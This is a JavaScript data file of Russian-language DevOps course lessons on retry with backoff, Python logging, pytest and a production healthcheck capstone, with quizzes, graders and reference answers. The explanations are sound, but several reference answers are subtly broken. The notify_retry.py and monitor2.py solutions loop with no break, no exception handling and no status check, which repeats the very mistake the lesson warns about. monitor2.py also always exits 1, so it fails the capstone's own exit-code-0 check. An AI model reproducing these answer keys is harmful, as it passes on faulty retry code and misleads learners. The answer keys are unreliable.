          "          time.sleep(delay)\n" +
          "  else:\n" +
          '      print("сервис так и не ответил за 5 попыток")\n' +
          "      sys.exit(1)\n\n" +
          "Смотри на  else  у цикла  for  — редкая, но очень удобная конструкция\n" +
          "Python: этот блок выполняется, только если цикл дошёл до конца БЕЗ  break .\n" +
          "То есть ровно тогда, когда все попытки провалились.",
      },
      {
        kind: "say",
        text:
          "Пример 2 — ДЖИТТЕР (jitter), случайная добавка к паузе:\n\n" +
          "  import random\n" +
          "  delay = 2 ** attempt + random.uniform(0, 1)\n\n" +
          "Зачем? Если двести скриптов упали одновременно (сервис моргнул), то с\n" +
          "чистым backoff они и повторят одновременно — ровно через 1 секунду все\n" +
          "двести. Получится тот же залп, только с задержкой.\n" +
          "Случайная добавка размазывает повторы во времени. В больших системах\n" +
          "jitter обязателен — про него любят спросить на собеседовании уровнем выше.",
      },
      {
        kind: "say",
        text:
          "Пример 3 — готовая библиотека вместо ручного цикла. В проде обычно берут\n" +
          "tenacity:\n\n" +
          "  from tenacity import retry, stop_after_attempt, wait_exponential\n\n" +
          "  @retry(stop=stop_after_attempt(5),\n" +
          "         wait=wait_exponential(multiplier=1, max=30))\n" +
          "  def fetch(url):\n" +
          "      r = requests.get(url, timeout=5)\n" +
          "      r.raise_for_status()\n" +
          "      return r\n\n" +
          "Одна строка-декоратор — и функция сама повторяется с backoff. Писать цикл\n" +
          "руками стоит уметь (чтобы понимать, что происходит), а в реальном проекте\n" +
          "лучше взять проверенную библиотеку.",
      },
      {
        kind: "say",
        text:
          "ГЛАВНОЕ: ЧТО повторять, а что — категорически нет.\n\n" +
          "  Можно повторять (временное, «само пройдёт»):\n" +
          "    • таймаут, обрыв соединения, DNS не ответил\n" +
          "    • 502 / 503 / 504 — сервис перезапускается или перегружен\n" +
          "    • 429 Too Many Requests — но паузу брать из заголовка Retry-After\n\n" +
          "  Повторять БЕССМЫСЛЕННО и вредно:\n" +
          "    • 400 Bad Request — запрос кривой, через секунду он таким же и останется\n" +
          "    • 401 / 403 — токен не тот; сто повторов не сделают его правильным\n" +
          "    • 404 — объекта нет\n\n" +
          "Слепой retry на 4xx — это просто трата времени и лишняя нагрузка. Проверяй\n" +
          "код ответа:  if r.status_code < 500: break .",
      },
      {
        kind: "say",
        text:
          "ТИПИЧНАЯ ОШИБКА НОВИЧКА — retry без  break :\n\n" +
          "  for attempt in range(3):\n" +
          "      try:\n" +
          "          r = requests.get(url, timeout=5)   # << нет break после успеха\n" +
          "      except requests.RequestException:\n" +
          "          time.sleep(2)\n\n" +
          "Такой цикл делает ВСЕ три запроса даже когда первый прошёл успешно.\n" +
          "Утроенная нагрузка на ровном месте — а если запрос не только читает, но и\n" +
          "что-то создаёт, то и три одинаковых записи вместо одной.\n\n" +
          "Отсюда второе правило: повторять можно только ИДЕМПОТЕНТНЫЕ операции —\n" +
          "те, повтор которых ничего не меняет. GET проверки, чтение статуса — можно.\n" +
          "«Списать деньги» или «отправить уведомление» — нельзя, пока сервер не\n" +
          "поддерживает ключ идемпотентности.",
      },
      {
        kind: "quiz",
        text: "API ответил 403 Forbidden. Стоит ли повторять запрос трижды с паузой?",
        options: [
          "Нет: 403 — проблема доступа, повтор не поможет. Ретраят таймауты и 5xx, а 4xx нужно чинить, а не повторять",
          "Да, любую ошибку нужно ретраить одинаково",
          "Да, но только с паузой больше минуты",
        ],
        answer: 0,
        explain:
          "Повторяют то, что может само пройти: таймаут, обрыв, 502/503/504, 429. Ошибки запроса и доступа повтором не лечатся.",
      },
      {
        kind: "quiz",
        text: "Зачем к паузе между попытками добавляют случайный джиттер?",
        options: [
          "Чтобы сотни клиентов, упавших одновременно, не повторили запрос тоже одновременно и не добили сервис залпом",
          "Чтобы скрипт выполнялся быстрее",
          "Чтобы обойти ограничение по количеству запросов",
        ],
        answer: 0,
        explain:
          "Без джиттера синхронно упавшие клиенты синхронно и ретраят. Случайная добавка размазывает нагрузку во времени.",
      },
      {
        kind: "do",
        text:
          "Задача: создай  notify_retry.py . Набери:\n" +
          "edit notify_retry.py\n" +
          "3 попытки в for с time.sleep(2), GET http://metrics-nonexistent:9999/export,\n" +
          "timeout=5, в конце sys.exit(1). Сохрани.",
        check: (w) =>
          has(`${DIR}/notify_retry.py`, /for\s+\w+\s+in\s+range\(\s*3\s*\)/)(w) &&
          has(`${DIR}/notify_retry.py`, /time\.sleep\(/)(w),
        answer:
          "#!/usr/bin/env python3\nimport sys\nimport time\nimport requests\n\n" +
          'URL = "http://metrics-nonexistent:9999/export"\n\n' +
          "for attempt in range(3):\n" +
          "    r = requests.get(URL, timeout=5)\n" +
          "    time.sleep(2)\n" +
          "sys.exit(1)\n",
        editFile: `${DIR}/notify_retry.py`,
        hint: "for attempt in range(3):  с  time.sleep(2)  внутри цикла вокруг requests.get(URL, timeout=5).",
      },
      {
        kind: "do",
        text: "Задача: запусти —  python3 notify_retry.py . Смотри, как выглядят три попытки подряд.",
        check: ranAny(/^python3?\s+notify_retry\.py/),
        answer: "python3 notify_retry.py",
        hint: "Команда:  python3 notify_retry.py",
      },
      {
        kind: "quiz",
        text: "Почему у retry обязательно должен быть потолок попыток (например, 3)?",
        options: [
          "Без потолка при постоянной недоступности сервиса скрипт будет пытаться бесконечно — тот же зависший процесс, что и без timeout",
          "Python не разрешает больше 3 повторов в цикле",
          "Это только для красоты в логах",
        ],
        answer: 0,
        explain:
          "Retry без потолка — это отложенное зависание. Ограничение попыток обязательно, как и timeout.",
      },
    ],
  },
  {
    id: "14.17",
    act: 14,
    title: "logging вместо print",
    xp: 45,
    intro:
      "print() удобен для тренировки, но у прод-скрипта должны быть уровни и время в логах. " +
      "Разница становится очевидной в 3 часа ночи, когда ты разбираешь чужую аварию.",
    setup: (w) => {
      seedScripts(w);
      w.templates = {
        [`${DIR}/cleanup_log.py`]:
          "# ЗАДАЧА: настрой logging.basicConfig(level=logging.INFO),\n" +
          "# возьми logger = logging.getLogger(__name__),\n" +
          "# напиши logger.info(...) об успехе и logger.error(...) об ошибке.\n" +
          "# Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "ИСТОРИЯ ИЗ ЖИЗНИ. Скрипт  cleanup.py  раз в час чистил временные файлы и\n" +
          "рапортовал через print():\n\n" +
          '  print("удалено файлов:", n)\n\n' +
          "В кроне он был прописан так:\n\n" +
          "  0 * * * * /opt/scripts/cleanup.py\n\n" +
          "Без перенаправления вывода. А значит stdout уходил... никуда. Точнее, крон\n" +
          "пытался отправить его почтой на локальный ящик, которого никто не читал\n" +
          "и который вообще был не настроен.\n\n" +
          "Однажды ночью у скрипта кончилось место на диске, он начал падать на\n" +
          "каждом запуске. Никто не узнал. Через две недели диск забился целиком и\n" +
          "утянул за собой базу. Когда пришли разбираться, вопрос был один:\n" +
          "«а где логи скрипта?» Ответа не было — их просто не существовало.\n\n" +
          "print пишет в stdout. Если stdout никуда не направлен, ты не логируешь —\n" +
          "ты разговариваешь сам с собой.",
      },
      {
        kind: "say",
        text:
          "print() ничего не знает об уровне важности и не пишет время. В проде\n" +
          "используют модуль  logging :\n\n" +
          "  import logging\n" +
          "  logging.basicConfig(level=logging.INFO)\n" +
          "  logger = logging.getLogger(__name__)\n\n" +
          '  logger.info("сервис проверен, статус 200")\n' +
          '  logger.warning("ответ медленный: 4.8s")\n' +
          '  logger.error("сервис недоступен: %s", err)\n',
      },
      {
        kind: "say",
        text:
          "Что это даёт по сравнению с print:\n\n" +
          "  • у каждой строки уровень (DEBUG/INFO/WARNING/ERROR) — можно фильтровать\n" +
          "    без изменения кода: включить DEBUG для отладки, в проде оставить INFO+\n" +
          "  • автоматически пишется время и имя модуля — не нужно добавлять руками\n" +
          "  • логи легко перенаправить в файл или систему сбора логов (тот же путь,\n" +
          "    что journalctl в Акте 2 и логи контейнера в Акте 6)\n\n" +
          "print() оставляют для мелких одноразовых скриптов и вывода результата пользователю.",
      },
      {
        kind: "say",
        text:
          "Пример 1 — УРОВНИ на практике. Один и тот же код, разная детальность:\n\n" +
          "  logging.basicConfig(level=logging.INFO)\n\n" +
          '  logger.debug("тело ответа: %s", r.text)      # не покажется при INFO\n' +
          '  logger.info("сервис проверен, статус 200")   # покажется\n' +
          '  logger.warning("ответ медленный: 4.8s")      # покажется\n' +
          '  logger.error("сервис недоступен")            # покажется\n\n' +
          "Хочешь отладить — меняешь ОДНО значение на  logging.DEBUG , и подробности\n" +
          "появляются. С print пришлось бы комментировать и раскомментировать строки\n" +
          "по всему файлу, а потом случайно закоммитить половину раскомментированной.\n\n" +
          "Ещё лучше — брать уровень из окружения (урок 14.14):\n\n" +
          '  level = os.environ.get("LOG_LEVEL", "INFO")\n' +
          "  logging.basicConfig(level=level)\n\n" +
          "Тогда включить debug в проде можно вообще без правки кода и релиза.",
      },
      {
        kind: "say",
        text:
          "Пример 2 — ФОРМАТ и куда писать. По умолчанию logging пишет в stderr\n" +
          "скупой строкой. Настраивается одним вызовом:\n\n" +
          "  logging.basicConfig(\n" +
          "      level=logging.INFO,\n" +
          '      format="%(asctime)s %(levelname)s %(name)s: %(message)s",\n' +
          '      filename="/var/log/cleanup.log",   # или не указывать -> в stderr\n' +
          "  )\n\n" +
          "Результат в файле:\n\n" +
          "  2024-05-14 03:12:07,441 ERROR __main__: сервис недоступен: timeout\n\n" +
          "Важная тонкость про контейнеры (Акт 6): внутри контейнера в файл писать\n" +
          "НЕ надо. Контейнер должен писать в stdout/stderr, а собирает их уже\n" +
          "docker logs / кластер. Файл внутри контейнера умрёт вместе с ним.",
      },
      {
        kind: "say",
        text:
          "Пример 3 — ИСКЛЮЧЕНИЯ в логах. Есть отдельный метод, который дописывает\n" +
          "полный трейсбек:\n\n" +
          "  try:\n" +
          "      r = requests.get(url, timeout=5)\n" +
          "      r.raise_for_status()\n" +
          "  except requests.RequestException:\n" +
          '      logger.exception("healthcheck упал")\n' +
          "      sys.exit(1)\n\n" +
          "  logger.exception(...) = logger.error(...) + трейсбек целиком.\n\n" +
          "Вызывать его можно только внутри  except . Это ровно та ситуация, где\n" +
          "трейсбек нужен: ошибка уже случилась, и завтра ты будешь искать строку,\n" +
          "в которой всё сломалось.",
      },
      {
        kind: "do",
        text:
          "Задача: создай  cleanup_log.py . Набери:\n" +
          "edit cleanup_log.py\n" +
          "Настрой  logging.basicConfig(level=logging.INFO) , возьми\n" +
          "logger = logging.getLogger(__name__)  и напиши пару записей:\n" +
          "logger.info(...) и logger.error(...). Сохрани.",
        check: (w) =>
          has(`${DIR}/cleanup_log.py`, /logging\.basicConfig\(/)(w) &&
          has(`${DIR}/cleanup_log.py`, /\.(info|error)\(/)(w),
        answer:
          "#!/usr/bin/env python3\n" +
          "import logging\n" +
          "\n" +
          "logging.basicConfig(level=logging.INFO)\n" +
          "logger = logging.getLogger(__name__)\n" +
          "\n" +
          'logger.debug("список файлов получен")\n' +
          'logger.info("очистка завершена, удалено 128 файлов")\n' +
          'logger.error("не удалось удалить /tmp/lock: отказано в доступе")\n',
        editFile: `${DIR}/cleanup_log.py`,
        hint: "Нужны три вещи: import logging, logging.basicConfig(level=logging.INFO) и logger.info(...) / logger.error(...).",
      },
      {
        kind: "do",
        text: "Задача: запусти —  python3 cleanup_log.py . Посмотри, как выглядит строка лога.",
        check: ran(/^python3?\s+cleanup_log\.py/),
        answer: "python3 cleanup_log.py",
        hint: "Команда:  python3 cleanup_log.py",
      },
      {
        kind: "say",
        text:
          "Видишь структуру каждой строки: время, УРОВЕНЬ, имя модуля, сообщение.\n" +
          "Ничего из этого ты руками не писал — это дал logging.\n\n" +
          "И заметь: строки  logger.debug(...)  в выводе нет. Порог стоит на INFO,\n" +
          "значит всё, что ниже уровнем, отбрасывается. Поставишь  level=logging.DEBUG \n" +
          "— она появится, код при этом не меняется ни на символ.",
      },
      {
        kind: "say",
        text:
          "ТИПИЧНАЯ ОШИБКА НОВИЧКА — склеивать сообщение через f-строку:\n\n" +
          '  ✗  logger.debug(f"ответ сервиса: {r.text}")\n' +
          '  ✓  logger.debug("ответ сервиса: %s", r.text)\n\n' +
          "В первом варианте строка собирается ВСЕГДА, даже если уровень DEBUG\n" +
          "выключен и запись будет тут же выброшена. Если r.text — мегабайт, ты\n" +
          "платишь за него на каждом вызове впустую. Во втором подстановка\n" +
          "происходит, только если запись реально пойдёт в лог.\n\n" +
          "Вторая ошибка — использовать сам модуль вместо логгера:\n\n" +
          '  ✗  logging.info("...")    — пишет в корневой логгер, теряется имя модуля\n' +
          "  ✓  logger = logging.getLogger(__name__)\n" +
          '     logger.info("...")     — видно, какой модуль это сказал\n\n' +
          "И третья, самая обидная — залогировать секрет. Про неё было в 14.13:\n" +
          "лог живёт годами и доступен многим.",
      },
      {
        kind: "quiz",
        text:
          "Крон-скрипт пишет всё через print(), а в crontab строка без перенаправления вывода.\n" +
          "Что произойдёт при аварии ночью?",
        options: [
          "Сообщения об ошибке фактически исчезнут: stdout никуда не собирается, и об аварии никто не узнает",
          "Ничего страшного: print всегда пишет в системный журнал",
          "Скрипт не запустится вообще без перенаправления",
        ],
        answer: 0,
        explain:
          "print пишет в stdout. Не собрал stdout — не залогировал. Поэтому в проде берут logging и настраивают, куда он идёт.",
      },
      {
        kind: "quiz",
        text: 'Почему пишут  logger.debug("ответ: %s", data) , а не  logger.debug(f"ответ: {data}") ?',
        options: [
          "При выключенном DEBUG подстановка %s не выполняется вообще, а f-строка склеивается всегда — впустую тратится время и память",
          "f-строки нельзя использовать вместе с logging, это синтаксическая ошибка",
          "Разницы нет, это дело вкуса",
        ],
        answer: 0,
        explain:
          "Ленивое форматирование: logging подставит аргументы, только если запись реально попадёт в лог.",
      },
      {
        kind: "quiz",
        text: "Чем logging.error(...) лучше print(...) для прод-скрипта?",
        options: [
          "Есть уровни важности, время и источник записи; можно менять детальность без правки кода и слать в общий сборщик логов",
          "logging работает быстрее print в несколько раз",
          "print вообще не выводит текст в консоль",
        ],
        answer: 0,
        explain:
          "logging — это структурированный, управляемый по уровню вывод. print — просто текст в stdout.",
      },
    ],
  },
  {
    id: "14.18",
    act: 14,
    title: "Мини-тест для скрипта",
    xp: 20,
    intro: "Даже маленький скрипт можно проверить автоматически, не запуская его руками.",
    steps: [
      {
        kind: "say",
        text:
          "У тебя есть функция для повторного использования — например, разбор\n" +
          'порога из конфига. Такую логику стоит вынести из "голого" тела скрипта\n' +
          "в функцию и написать для неё тест:\n\n" +
          "  def is_disk_low(percent_free: float, threshold: float = 10.0) -> bool:\n" +
          "      return percent_free < threshold\n\n" +
          "  def test_is_disk_low():\n" +
          "      assert is_disk_low(5.0) is True\n" +
          "      assert is_disk_low(50.0) is False\n",
      },
      {
        kind: "say",
        text:
          "Такие тесты запускают библиотекой  pytest :\n\n" +
          "  pytest test_disk.py -v\n\n" +
          "pytest сам находит функции  test_*  и показывает, какие assert прошли,\n" +
          "какие — нет. В CI (Акт 7) это отдельный шаг pipeline, который должен быть\n" +
          "зелёным перед merge — тот же принцип, что unit-тесты в любом другом языке.",
      },
      {
        kind: "quiz",
        text: "Зачем логику из скрипта выносят в отдельную функцию вроде is_disk_low()?",
        options: [
          "Функцию можно протестировать напрямую (assert) без запуска всего скрипта и без реального диска",
          "Функции выполняются быстрее, чем код в теле скрипта",
          "Без функций pytest вообще не работает",
        ],
        answer: 0,
        explain: "Тестируемость — это в первую очередь маленькие чистые функции без побочных эффектов.",
      },
    ],
  },
  {
    id: "14.19",
    act: 14,
    title: "Ревью прод-скрипта",
    xp: 25,
    intro: "Собери воедино все признаки скрипта, который не стыдно отдать в прод.",
    steps: [
      {
        kind: "say",
        text:
          "Чек-лист прод-готовности python-скрипта для автоматизации (пройдись по\n" +
          "каждому пункту и вспомни, в каком уроке акта он разбирался):\n\n" +
          "  ☐ секреты — через os.environ, не в коде (14.13, 14.15)\n" +
          "  ☐ сетевые вызовы — с timeout= (14.5)\n" +
          "  ☐ конкретные исключения пойманы, ошибка не глушится (14.6)\n" +
          "  ☐ временный сбой сети — retry с потолком и паузой (14.16)\n" +
          "  ☐ аргументы — через argparse, не sys.argv[1] (14.7)\n" +
          "  ☐ внешние команды — subprocess со списком, без shell=True (14.8)\n" +
          "  ☐ логи — logging, а не голый print (14.17)\n" +
          "  ☐ зависимости зафиксированы в requirements.txt (14.10)\n" +
          "  ☐ код возврата осмысленный: 0 — ок, не 0 — реальная проблема (14.3)",
      },
      {
        kind: "say",
        text:
          "Это не формальность ради галочек — каждый пункт закрывает конкретный\n" +
          "инцидент, который ты уже разбирал в этом акте: зависший крон, тихий сбой,\n" +
          "утекший токен. Хороший скрипт — это накопленный опыт чужих 3 часов ночи.",
      },
      {
        kind: "quiz",
        text: "В скрипте нашли: нет timeout, print вместо logging, но зато отличный argparse. Что чинить первым?",
        options: [
          "timeout — его отсутствие может подвесить процесс насовсем, это выше по риску, чем стиль логов",
          "Ничего чинить не надо, раз argparse хороший",
          "logging — это самое важное во всех случаях",
        ],
        answer: 0,
        explain: "Приоритет — по риску инцидента. Зависший процесс намного хуже, чем print вместо logging.",
      },
    ],
  },
  {
    id: "14.20",
    act: 14,
    title: "Капстоун 2: прод-версия healthcheck-CLI",
    xp: 50,
    intro: "Тот же monitor.py, но теперь с секретом из окружения и повтором при сбое.",
    setup: (w) => {
      seedScripts(w);
      w.templates = {
        [`${DIR}/monitor2.py`]:
          "# ЗАДАЧА: прод-версия healthcheck.\n" +
          "#  argparse: обязательный --url\n" +
          '#  токен из os.environ.get("API_TOKEN", "") — не обязателен\n' +
          "#  3 попытки в for с time.sleep(2), requests.get(args.url, timeout=5)\n" +
          "#  после всех попыток -> sys.exit(1)\n" +
          "# Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Финал акта. Улучши свой healthcheck-инструмент до прод-версии: токен из\n" +
          "окружения (необязательный) и устойчивость к разовому сетевому сбою через\n" +
          "retry. Ошибёшься — подсказка, ещё раз — готовый ответ.",
      },
      {
        kind: "do",
        text:
          "Шаг 1. Напиши  monitor2.py . Набери:\n" +
          "edit monitor2.py\n" +
          'argparse с обязательным --url; токен через os.environ.get("API_TOKEN", "");\n' +
          "3 попытки в for с time.sleep(2) вокруг requests.get(args.url, timeout=5);\n" +
          "sys.exit(1) после цикла. Сохрани.",
        check: (w) =>
          has(`${DIR}/monitor2.py`, /add_argument\(\s*["']--url["'][^\n]*required\s*=\s*True/)(w) &&
          has(`${DIR}/monitor2.py`, /os\.environ\.get\(\s*["']API_TOKEN["']/)(w) &&
          has(`${DIR}/monitor2.py`, /for\s+\w+\s+in\s+range\(\s*3\s*\)/)(w) &&
          has(`${DIR}/monitor2.py`, /time\.sleep\(/)(w),
        answer:
          "#!/usr/bin/env python3\n" +
          "import argparse\n" +
          "import os\n" +
          "import sys\n" +
          "import time\n" +
          "import requests\n" +
          "\n" +
          'parser = argparse.ArgumentParser(description="прод healthcheck")\n' +
          'parser.add_argument("--url", required=True)\n' +
          "args = parser.parse_args()\n" +
          "\n" +
          'token = os.environ.get("API_TOKEN", "")\n' +
          "\n" +
          "for attempt in range(3):\n" +
          "    r = requests.get(args.url, timeout=5)\n" +
          "    time.sleep(2)\n" +
          "sys.exit(1)\n",
        editFile: `${DIR}/monitor2.py`,
        hint:
          'Нужны: add_argument("--url", required=True), os.environ.get("API_TOKEN", ""), ' +
          "for attempt in range(3): с time.sleep(2) вокруг requests.get(args.url, timeout=5).",
      },
      {
        kind: "do",
        text: "Шаг 2. Запусти на недоступном адресе, чтобы увидеть все попытки.",
        check: ranAny(/^python3?\s+monitor2\.py\s+--url\s+http:\/\/metrics-nonexistent/),
        answer: "python3 monitor2.py --url http://metrics-nonexistent:9999/export",
        hint: "Команда:  python3 monitor2.py --url http://metrics-nonexistent:9999/export",
      },
      {
        kind: "do",
        text: "Шаг 3. Теперь запусти на живом адресе, задав токен через окружение.",
        check: (w) =>
          w.log.some(
            (l) => /^python3?\s+monitor2\.py\s+--url\s+http:\/\/localhost/.test(l.cmd) && l.code === 0,
          ),
        answer: "export API_TOKEN=demo-token\npython3 monitor2.py --url http://localhost:8080/health",
        hint: "Сначала  export API_TOKEN=demo-token , потом  python3 monitor2.py --url http://localhost:8080/health",
      },
      {
        kind: "say",
        text:
          "Курс пройден. Ты прошёл путь от  pwd  до полноценного DevOps-набора:\n\n" +
          "  Linux и процессы · bash · сети · git · Docker · CI/CD · Terraform ·\n" +
          "  Kubernetes · дежурство и надёжность · Prometheus · Grafana · Zabbix ·\n" +
          "  Python для автоматизации, включая секреты, retry и прод-чеклист.\n\n" +
          "Что дальше:\n" +
          "  • финальное задание на реальном сервере (capstone) — кнопка «Финал»\n" +
          "  • разделы «Собеседование» и «Карьера» — прогони вопросы вслух\n" +
          "  • держи руки в деле: свой сервер, свой pet-проект, свой pipeline.\n\n" +
          "Удачи на собеседовании — ты к нему готов.",
      },
    ],
  },
];
